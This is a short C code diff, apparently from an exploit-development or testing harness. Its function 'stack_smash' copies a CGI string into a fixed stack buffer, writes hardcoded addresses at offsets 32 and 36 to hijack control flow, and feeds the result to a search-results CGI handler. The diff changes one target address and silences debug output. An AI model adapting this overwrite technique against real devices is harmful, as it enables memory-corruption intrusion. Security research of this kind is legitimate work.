@@ -170,14 +170,17 @@ void stack_smash(void) {
 
   char cgistr[200];
 
+  DatabaseInit();
+
   strcpy(cgistr, globcgistr);
   
-  printf("cgistr = \n  %s\n", cgistr);
+  /* printf("cgistr = \n  %s\n", cgistr); */
   *(uint32_t*)(&cgistr[32]) = 0x80fffe10;
-  *(uint32_t*)(&cgistr[36]) = 0x20404ecc;
+  /* *(uint32_t*)(&cgistr[36]) = 0x20404ecc; */
+  *(uint32_t*)(&cgistr[36]) = 0x20405104;
 
   //  *(uint32_t*)(cgistr[strlen(",type:")+32]) = 0xDEADBEEF;
-  printf("cgistr = \n  %s\n", cgistr);
+  /* printf("cgistr = \n  %s\n", cgistr); */
   
   printf("sending to search results cgi fn\n");
   CgiSearchResults(0x0, 0, 0x0, 0, cgistr);
